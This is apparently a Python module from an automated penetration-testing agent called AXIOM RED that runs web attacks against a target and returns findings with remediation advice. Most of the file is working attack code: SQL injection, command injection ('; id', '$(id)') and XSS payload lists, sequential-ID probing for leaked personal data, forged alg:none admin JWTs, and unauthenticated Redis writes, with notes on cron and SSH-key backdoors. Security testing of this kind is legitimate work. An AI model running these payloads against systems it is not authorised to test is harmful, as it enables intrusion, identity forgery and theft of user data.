"""
AXIOM RED — Web Attack Tools
Phase 3 (TEST): SQLi, IDOR, XSS, Command Injection, JWT alg:none, Config Exposure.
Each function returns a Finding if vulnerability is confirmed, else None.
"""

import httpx, json, base64, re
from typing import Optional
from agent.core.state import Finding


BASE_HEADERS = {"Content-Type": "application/json", "User-Agent": "AXIOM-RED/1.0"}
TIMEOUT = 6.0


# ── SQL Injection ────────────────────────────────────────────────────────────
SQL_PAYLOADS = [
    ("' OR '1'='1", "error-based / auth bypass"),
    ("' OR 1=1--", "comment bypass"),
    ("'; SELECT sleep(2)--", "time-based blind"),
    ("' UNION SELECT 1,2,3--", "union-based"),
    ("1' AND (SELECT * FROM users)--", "error extraction"),
    ("' OR ''='", "always-true"),
]

SQL_ERROR_SIGNATURES = [
    "sql syntax", "syntax error", "sqlite", "mysql", "ora-",
    "unclosed quotation", "you have an error in your sql",
    "sqliteexception", "operationalerror", "psycopg2", "pg::", "odbc",
    "unterminated", "near \"", "incorrect syntax",
]

def _sqli_finding(url, endpoint, param, payload, technique, r) -> Finding:
    return Finding(
        title="SQL Injection",
        severity="Critical",
        cvss_score=9.1,
        description=f"SQL Injection confirmed via {technique} in parameter '{param}' at {endpoint}.",
        endpoint=url,
        method="GET",
        payload=payload,
        evidence=r.text[:500],
        request_dump=f"GET {url}?{param}={payload}",
        response_dump=r.text[:300],
        remediation=(
            "1. Use parameterised queries / prepared statements exclusively.\n"
            "2. Never concatenate user input into SQL strings.\n"
            "3. Apply input validation and an allow-list.\n"
            "4. Enable a WAF with SQL injection rules."
        ),
        owasp_id="A03",
        owasp_category="A03:2021 Injection",
        poc_curl=f'curl -s "{url}?{param}={payload}"',
    )

def test_sqli(base_url: str, endpoint: str, param: str) -> Optional[Finding]:
    import time as _time
    url = f"{base_url}{endpoint}"

    def _get(val):
        try:
            return httpx.get(url, params={param: val}, timeout=TIMEOUT, verify=False)
        except Exception:
            return None

    # (1) Error-based: only trust explicit SQL error signatures.
    for payload, technique in SQL_PAYLOADS:
        r = _get(payload)
        if r is None:
            continue
        if any(sig in r.text.lower() for sig in SQL_ERROR_SIGNATURES):
            return _sqli_finding(url, endpoint, param, payload, f"error-based ({technique})", r)

    # (2) Boolean-based blind: use -- to escape SQL template suffix (e.g. LIKE '%{q}%').
    base   = _get("axiomtest")
    r_true = _get("axiomtest' OR 1=1-- ")
    r_false= _get("axiomtest' AND 1=2-- ")
    if base and r_true and r_false and r_true.status_code == 200:
        # Require significant size difference (>50 bytes) to prove extra DB rows, not just
        # different error messages — prevents false positives on non-SQL endpoints.
        if (len(r_true.text) > len(r_false.text) + 50
                and len(r_true.text) > len(base.text) + 50):
            return _sqli_finding(
                url, endpoint, param, "axiomtest' OR 1=1-- ",
                "boolean-based blind (differential response length)", r_true,
            )

    # (3) Time-based blind: measure a real delay (fires on MySQL-like backends; harmless on SQLite).
    delay_payload = "axiomtest' OR sleep(3)-- -"
    t0 = _time.time()
    r_delay = _get(delay_payload)
    elapsed = _time.time() - t0
    if r_delay is not None and elapsed >= 2.5:
        return _sqli_finding(
            url, endpoint, param, delay_payload,
            f"time-based blind ({elapsed:.1f}s delay observed)", r_delay,
        )

    return None


# ── IDOR (Insecure Direct Object Reference) ──────────────────────────────────
SENSITIVE_FIELDS = ["ssn", "credit_card", "password", "token", "secret", "cc"]

def test_idor(base_url: str, endpoint_template: str, ids: list[int] = None) -> Optional[Finding]:
    """Test sequential IDs for unauthorised data access."""
    ids = ids or [1, 2, 3, 4, 5]
    leaked = []
    for uid in ids:
        url = f"{base_url}{endpoint_template.replace('<id>', str(uid))}"
        try:
            r = httpx.get(url, timeout=TIMEOUT, verify=False)
            if r.status_code == 200:
                data = r.json()
                exposed = [f for f in SENSITIVE_FIELDS if f in str(data).lower()]
                if exposed:
                    leaked.append({"id": uid, "fields": exposed, "sample": str(data)[:200]})
        except Exception:
            pass

    if leaked:
        return Finding(
            title="IDOR — Insecure Direct Object Reference",
            severity="High",
            cvss_score=7.5,
            description=f"Sequential user IDs expose sensitive PII without authentication. "
                        f"Affected IDs: {[l['id'] for l in leaked]}. "
                        f"Exposed fields: {list(set(f for l in leaked for f in l['fields']))}",
            endpoint=f"{base_url}{endpoint_template}",
            method="GET",
            payload="IDs: 1,2,3,4,5",
            evidence=json.dumps(leaked, indent=2)[:600],
            request_dump=f"GET {base_url}{endpoint_template} (no auth header)",
            response_dump=leaked[0]["sample"] if leaked else "",
            remediation=(
                "1. Enforce object-level authorisation on every resource endpoint.\n"
                "2. Replace sequential integer IDs with UUIDs.\n"
                "3. Validate that the authenticated user owns the requested resource.\n"
                "4. Apply RBAC middleware to all data endpoints."
            ),
            owasp_id="A01",
            owasp_category="A01:2021 Broken Access Control",
            poc_curl=f'curl -s "{base_url}{endpoint_template.replace("<id>", "1")}"',
        )
    return None


# ── JWT alg:none Bypass ───────────────────────────────────────────────────────
def _forge_jwt_none(payload: dict) -> str:
    """Forge a JWT with algorithm 'none' — no signature."""
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    body = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b"=").decode()
    return f"{header}.{body}."   # Empty signature

def test_jwt_none(base_url: str, endpoint: str) -> Optional[Finding]:
    forged = _forge_jwt_none({"user_id": 1, "username": "admin", "role": "admin"})
    url = f"{base_url}{endpoint}"
    try:
        r = httpx.get(url, headers={"Authorization": f"Bearer {forged}"}, timeout=TIMEOUT, verify=False)
        if r.status_code == 200 and ("admin" in r.text.lower() or "users" in r.text.lower()):
            return Finding(
                title="JWT Algorithm Confusion — alg:none Bypass",
                severity="Critical",
                cvss_score=9.3,
                description="The API accepts JWTs with 'alg:none', bypassing signature verification entirely. "
                            "An attacker can forge any identity including admin roles.",
                endpoint=url,
                method="GET",
                payload=f"Forged JWT: {forged[:80]}...",
                evidence=r.text[:500],
                request_dump=f"GET {url}\nAuthorization: Bearer {forged}",
                response_dump=r.text[:300],
                remediation=(
                    "1. Reject 'none' algorithm explicitly in JWT validation.\n"
                    "2. Use jwt.decode() with algorithms=['HS256'] only — never include 'none'.\n"
                    "3. Rotate the JWT signing secret immediately.\n"
                    "4. Consider switching to RS256 (asymmetric) for production."
                ),
                owasp_id="A02",
                owasp_category="A02:2021 Cryptographic Failures",
                poc_curl=f'curl -s -H "Authorization: Bearer {forged[:60]}..." "{url}"',
            )
    except Exception:
        pass
    return None


# ── Command Injection ─────────────────────────────────────────────────────────
def test_command_injection(base_url: str, endpoint: str, param: str) -> Optional[Finding]:
    import random
    url = f"{base_url}{endpoint}"
    canary = f"AX{random.randint(100000, 999999)}RED"

    # Each payload either echoes the unique canary or runs `id` (uid= is a specific signal).
    payloads = [
        (f"127.0.0.1; echo {canary}",     "semicolon echo canary"),
        (f"127.0.0.1 && echo {canary}",   "AND echo canary"),
        (f"127.0.0.1 | echo {canary}",    "pipe echo canary"),
        ("127.0.0.1; id",                 "semicolon id"),
        ("$(id)",                         "subshell id"),
    ]
    for payload, technique in payloads:
        try:
            r = httpx.get(url, params={param: payload}, timeout=TIMEOUT, verify=False)
        except Exception:
            continue
        body = r.text
        hit = (canary in body) or ("uid=" in body and "gid=" in body)
        if hit:
            return Finding(
                title="OS Command Injection",
                severity="Critical",
                cvss_score=9.8,
                description=(
                    f"Unsanitised parameter '{param}' is passed to a shell. "
                    f"Technique: {technique}. "
                    f"{'Unique canary echoed back' if canary in body else 'Output of id visible'} — "
                    "confirms arbitrary command execution."
                ),
                endpoint=url,
                method="GET",
                payload=payload,
                evidence=body[:500],
                request_dump=f"GET {url}?{param}={payload}",
                response_dump=body[:300],
                remediation=(
                    "1. Never pass user input to shell commands. Use language-native APIs.\n"
                    "2. If shell calls are required, use subprocess with shell=False and an args list.\n"
                    "3. Apply strict input validation (allow-list of safe characters).\n"
                    "4. Run the application as a non-root user."
                ),
                owasp_id="A03",
                owasp_category="A03:2021 Injection",
                poc_curl=f'curl -s "{url}?{param}={payload}"',
            )
    return None


# ── Sensitive Config Exposure ──────────────────────────────────────────────────
SENSITIVE_CONFIG_KEYS = ["password", "secret", "api_key", "token", "db_pass", "private"]

def test_config_exposure(base_url: str, endpoint: str) -> Optional[Finding]:
    url = f"{base_url}{endpoint}"
    try:
        r = httpx.get(url, timeout=TIMEOUT, verify=False)
        if r.status_code == 200:
            body = r.text.lower()
            exposed = [k for k in SENSITIVE_CONFIG_KEYS if k in body]
            if exposed:
                return Finding(
                    title="Sensitive Configuration Exposure",
                    severity="High",
                    cvss_score=7.7,
                    description=f"Unauthenticated endpoint exposes sensitive configuration data: {exposed}",
                    endpoint=url,
                    method="GET",
                    payload="None (unauthenticated GET)",
                    evidence=r.text[:500],
                    request_dump=f"GET {url}",
                    response_dump=r.text[:300],
                    remediation=(
                        "1. Remove /config and debug endpoints from production.\n"
                        "2. Require authentication for any diagnostic endpoint.\n"
                        "3. Store secrets in environment variables, not code.\n"
                        "4. Use a secrets manager (Vault, AWS Secrets Manager)."
                    ),
                    owasp_id="A05",
                    owasp_category="A05:2021 Security Misconfiguration",
                    poc_curl=f'curl -s "{url}"',
                )
    except Exception:
        pass
    return None


# ── Redis RCE ─────────────────────────────────────────────────────────────────
def test_redis_rce(host: str, port: int = 6379) -> Optional[Finding]:
    """Attempt Redis config rewrite to demonstrate RCE vector."""
    try:
        import redis as redis_lib
        r = redis_lib.Redis(host=host, port=port, socket_timeout=3)
        # Test write access (we won't actually write a shell in the demo — just prove we can)
        r.set("AXIOM_RED_RCE_PROOF", "rce_confirmed_via_unauthenticated_redis")
        val = r.get("AXIOM_RED_RCE_PROOF")
        info = r.info()
        if val:
            return Finding(
                title="Unauthenticated Redis — Remote Code Execution Vector",
                severity="Critical",
                cvss_score=9.8,
                description=(
                    "Redis is accessible without authentication. Attacker can:\n"
                    "  1. Dump all keys (data exfiltration)\n"
                    "  2. Write to /etc/cron.d via CONFIG SET (RCE as root)\n"
                    "  3. Write SSH authorized_keys (persistent backdoor)\n"
                    f"Proof: SET/GET succeeded. Redis version: {info.get('redis_version','unknown')}"
                ),
                endpoint=f"redis://{host}:{port}",
                method="TCP",
                payload="redis-cli SET AXIOM_RED_RCE_PROOF 'rce_confirmed'",
                evidence=f"Key written and read back: {val.decode()}",
                request_dump=f"redis-cli -h {host} -p {port} SET AXIOM_RED_RCE_PROOF rce_confirmed",
                response_dump=f"OK / GET response: {val.decode()}",
                remediation=(
                    "1. Set requirepass in redis.conf with a strong password.\n"
                    "2. Bind Redis to 127.0.0.1 only — never expose externally.\n"
                    "3. Rename or disable CONFIG, DEBUG, SAVE commands.\n"
                    "4. Run Redis as a dedicated low-privilege user.\n"
                    "5. Apply firewall rules blocking port 6379 from external access."
                ),
                owasp_id="A05",
                owasp_category="A05:2021 Security Misconfiguration",
                poc_curl=f'redis-cli -h {host} -p {port} SET test_key pwned',
            )
    except Exception:
        pass
    return None


# ── Cross-Site Scripting (XSS) ────────────────────────────────────────────────
XSS_PAYLOADS = [
    ("<script>alert('AXIOM-XSS')</script>",     "basic script tag"),
    ("<img src=x onerror=alert('xss')>",        "img onerror"),
    ("'\"><script>alert(1)</script>",            "attribute breakout"),
    ("<svg onload=alert('xss')>",               "SVG onload"),
]

XSS_INDICATORS = [
    "<script>alert(", "onerror=alert(", "onload=alert(", "<svg onload",
]

def test_xss(base_url: str, endpoint: str = "/api/v1/greet", param: str = "name") -> Optional[Finding]:
    """Test for Reflected XSS and Stored XSS."""
    url = f"{base_url}{endpoint}"

    # ── Reflected XSS
    for payload, technique in XSS_PAYLOADS:
        try:
            r = httpx.get(url, params={param: payload}, timeout=TIMEOUT, verify=False)
            body = r.text
            if any(ind in body for ind in XSS_INDICATORS) or payload in body:
                return Finding(
                    title="Cross-Site Scripting (XSS) — Reflected",
                    severity="High",
                    cvss_score=7.2,
                    description=(
                        f"Reflected XSS via {technique} in parameter '{param}' at {endpoint}. "
                        "User input is reflected in HTML without sanitisation. "
                        "An attacker can steal session cookies or execute arbitrary JavaScript."
                    ),
                    endpoint=url,
                    method="GET",
                    payload=payload,
                    evidence=body[:500],
                    request_dump=f"GET {url}?{param}={payload}",
                    response_dump=body[:300],
                    remediation=(
                        "1. HTML-escape all user input before rendering (use markupsafe.escape()).\n"
                        "2. Set Content-Security-Policy header to block inline scripts.\n"
                        "3. Use Jinja2 with autoescape=True.\n"
                        "4. Set HttpOnly and Secure flags on session cookies.\n"
                        "5. Never return raw user input in HTML responses."
                    ),
                    owasp_id="A03",
                    owasp_category="A03:2021 Injection",
                    poc_curl=f'curl -s "{url}?{param}={payload}"',
                )
        except Exception:
            pass

    # ── Stored XSS
    comment_url = f"{base_url}/api/v1/comment"
    for payload, technique in XSS_PAYLOADS[:2]:
        try:
            post_r = httpx.post(comment_url, json={"message": payload}, timeout=TIMEOUT, verify=False)
            if post_r.status_code in (200, 201):
                get_r = httpx.get(comment_url, timeout=TIMEOUT, verify=False)
                if payload in get_r.text or any(ind in get_r.text for ind in XSS_INDICATORS):
                    return Finding(
                        title="Cross-Site Scripting (XSS) — Stored",
                        severity="Critical",
                        cvss_score=8.8,
                        description=(
                            f"Stored XSS via {technique} on POST /api/v1/comment. "
                            "Payload persists and executes for every visitor — more dangerous than reflected XSS."
                        ),
                        endpoint=comment_url,
                        method="POST",
                        payload=payload,
                        evidence=get_r.text[:500],
                        request_dump=f'POST {comment_url}\nBody: {{"message": "{payload}"}}',
                        response_dump=get_r.text[:300],
                        remediation=(
                            "1. Sanitise all stored user content before rendering.\n"
                            "2. Use bleach or similar HTML sanitisation library.\n"
                            "3. Implement Content-Security-Policy headers.\n"
                            "4. Whitelist allowed HTML tags if rich text is needed.\n"
                            "5. Set HttpOnly on session cookies."
                        ),
                        owasp_id="A03",
                        owasp_category="A03:2021 Injection",
                        poc_curl=f"curl -s -X POST {comment_url} -H 'Content-Type: application/json' -d '{{\"message\": \"{payload}\"}}'",
                    )
        except Exception:
            pass

    return None
